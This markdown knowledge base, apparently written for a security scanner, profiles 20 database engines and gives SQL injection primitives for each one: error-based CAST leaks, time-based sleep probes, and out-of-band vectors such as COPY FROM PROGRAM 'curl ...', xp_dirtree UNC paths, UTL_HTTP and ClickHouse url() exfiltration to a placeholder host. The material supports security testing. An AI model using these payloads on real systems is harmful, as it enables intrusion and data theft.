# Complete DBMS Database Architecture & Engine Profiles (20 Systems)

**Document Identifier:** SENTINEL-RES-DBMS-DB  
**Classification:** Database Internals, Engine Architecture & Dialect Knowledge Base  

---

## 1. Engine Profiles (1 to 10)

### 1. PostgreSQL (v9.6 – v17.x)
- **Architecture**: Object-relational database with extensible type systems, procedural engines (PL/pgSQL, PL/Python), and background workers.
- **Comment Syntax**: `-- ` (requires space or newline), `/* ... */`.
- **String Concatenation**: `'a' || 'b'`, or `CONCAT('a', 'b')`.
- **Dollar Quoting**: `$$literal$$` or `$tag$literal$tag$` bypasses single-quote escaping.
- **CAST Coercion**: `CAST(x AS int)` / `x::int` throws verbose error: `invalid input syntax for type integer: "secret_val"`.
- **Sleep Primitive**: `pg_sleep(seconds)` returns `void`. Evaluatable inline via `CASE WHEN (...) THEN pg_sleep(3) ELSE pg_sleep(0) END`.
- **System Catalogs**: `information_schema.tables`, `pg_catalog.pg_tables`, `pg_catalog.pg_attribute`.
- **OAST Vectors**: `dblink_connect()`, `COPY tbl FROM PROGRAM 'curl ...'`.

### 2. MySQL (v5.7 – v9.0)
- **Architecture**: Storage-engine pluggable relational database (InnoDB, MyISAM, Memory).
- **Comment Syntax**: `-- ` (space required), `#`, `/* ... */`, `/*!50000 SQL_FRAGMENT */`.
- **String Concatenation**: `'a' 'b'` (implicit juxtaposition) or `CONCAT('a', 'b')`.
- **CAST Coercion**: `CAST(x AS unsigned)` / `EXTRACTVALUE(1, CONCAT(0x7e, x))` in MySQL $\le 8.0$.
- **Sleep Primitive**: `SLEEP(seconds)` returns integer `0`. Computational lock: `BENCHMARK(5000000, MD5('1'))`.
- **System Catalogs**: `information_schema.tables`, `information_schema.columns`.
- **OAST Vectors**: `LOAD_FILE('\\\\ip\\share')` (Windows UNC path).

### 3. MariaDB (v10.4 – v11.4)
- **Architecture**: Community fork of MySQL with dynamic columns, PL/SQL compatibility mode, and sequence engines.
- **Comment Syntax**: `-- `, `#`, `/* ... */`.
- **String Concatenation**: `CONCAT(a, b)` or `||` in `PIPES_AS_CONCAT` mode.
- **Sleep Primitive**: `SLEEP(seconds)` or `BENCHMARK()`.

### 4. Microsoft SQL Server (2012 – 2024)
- **Architecture**: Enterprise T-SQL relational database with CLR integration and service broker.
- **Comment Syntax**: `--`, `/* ... */`.
- **String Concatenation**: `'a' + 'b'` or `CONCAT('a', 'b')` (SQL Server 2012+).
- **CAST Coercion**: `CONVERT(int, x)` / `CAST(x AS int)` throws `Conversion failed when converting the nvarchar value '...' to data type int.`.
- **Sleep Primitive**: `WAITFOR DELAY '0:0:N'` (T-SQL procedural command).
- **Stacked Queries**: **Universal native support** at parser level (`SELECT 1; UPDATE tbl ...`).
- **System Catalogs**: `sys.tables`, `sys.columns`, `information_schema.tables`.
- **OAST Vectors**: `master..xp_dirtree '\\ip\share'`, `master..xp_fileexist '\\ip\share'`.

### 5. Oracle Database (11g – 23c)
- **Architecture**: Multi-tenant enterprise database (CDB/PDB) with PL/SQL engine.
- **Mandatory FROM Clause**: Every scalar `SELECT` must specify `FROM dual`.
- **String Concatenation**: `'a' || 'b'`.
- **Null Semantics**: Empty string `''` is treated as `NULL`.
- **CAST Coercion**: `TO_NUMBER(x)` or `CTXSYS.DRITHSX.SN(user, x)`.
- **Sleep Primitive**: `DBMS_LOCK.SLEEP(N)` or `APEX_UTIL.PAUSE(N)`.
- **System Catalogs**: `all_tables`, `user_tables`, `sys.dba_tables`.
- **OAST Vectors**: `UTL_HTTP.REQUEST('http://ip')`, `UTL_INADDR.GET_HOST_NAME('ip')`.

### 6. SQLite (v3.x)
- **Architecture**: Embedded serverless relational database engine with dynamic typing.
- **Comment Syntax**: `--`, `/* ... */`.
- **String Concatenation**: `'a' || 'b'`.
- **Type Affinity**: Dynamic typing prevents CAST exceptions.
- **Sleep Primitive**: Heavy computational queries (`randomblob(100000000)` or Cartesian joins).
- **System Catalogs**: `sqlite_master`, `sqlite_schema`.

### 7. IBM Db2 (LUW & z/OS)
- **Architecture**: Enterprise relational engine for Linux, UNIX, Windows, and mainframes.
- **Mandatory FROM Clause**: Queries require `FROM sysibm.sysdummy1`.
- **String Concatenation**: `'a' || 'b'` or `CONCAT('a', 'b')`.
- **System Catalogs**: `syscat.tables`, `syscat.columns`, `sysibm.systables`.

### 8. SAP HANA
- **Architecture**: In-memory columnar and relational database platform.
- **String Concatenation**: `'a' || 'b'`.
- **System Catalogs**: `SYS.TABLES`, `SYS.COLUMNS`.

### 9. CockroachDB
- **Architecture**: Distributed NewSQL database wire-compatible with PostgreSQL.
- **CAST Coercion**: `CAST(x AS int)` / `x::int` leaks schema data identical to PostgreSQL.
- **System Catalogs**: `information_schema.tables`, `crdb_internal.tables`.

### 10. TiDB
- **Architecture**: Distributed NewSQL database wire-compatible with MySQL.
- **String Concatenation**: `CONCAT(a, b)`.
- **System Catalogs**: `information_schema.tables`, `information_schema.columns`.

---

## 2. Engine Profiles (11 to 20)

### 11. YugabyteDB
- **Architecture**: Distributed SQL database implementing PostgreSQL query layer (YSQL).
- **Features**: Fully compatible with PostgreSQL injection grammars, `pg_sleep()`, and CAST errors.

### 12. DuckDB
- **Architecture**: In-process analytical OLAP database engine.
- **Features**: PostgreSQL-compatible syntax with rich Parquet/Arrow extensions and `information_schema`.

### 13. Snowflake
- **Architecture**: Cloud-native multi-cluster data warehouse.
- **Features**: `SYSTEM$WAIT(seconds)` procedural sleep; rich JSON variant querying via `parse_json()`.

### 14. Amazon Redshift
- **Architecture**: Cloud OLAP data warehouse derived from PostgreSQL 8.0.2.
- **Features**: Supports PostgreSQL-compatible `information_schema` and Spectrum external tables.

### 15. Google BigQuery SQL
- **Architecture**: Serverless multi-cloud data warehouse executing GoogleSQL (ANSI-compliant).
- **Features**: Strict typing, backtick identifiers, and `INFORMATION_SCHEMA` metadata views.

### 16. ClickHouse
- **Architecture**: High-performance columnar DBMS for real-time analytical reporting.
- **Features**: Built-in network table functions `url('http://...', CSV)` enable direct OAST data exfiltration.

### 17. Databricks SQL
- **Architecture**: Lakehouse SQL engine operating on Delta Lake storage.
- **Features**: ANSI SQL compliance, Spark SQL dialect, and `system.information_schema`.

### 18. Presto / Trino
- **Architecture**: Distributed SQL query engine for federated data sources.
- **Features**: ANSI SQL syntax, `information_schema.tables`, and connector-specific delegation.

### 19. Firebird
- **Architecture**: Open-source relational database engine with multi-generational concurrency.
- **Features**: `rdb$relations`, `rdb$relation_fields` metadata tables; `||` string concatenation.

### 20. H2 / Apache Derby / HSQLDB
- **Architecture**: Embedded Java relational databases.
- **Features**: Java class execution (`CALL java.lang.Thread.sleep(1000)`), `information_schema.tables`.
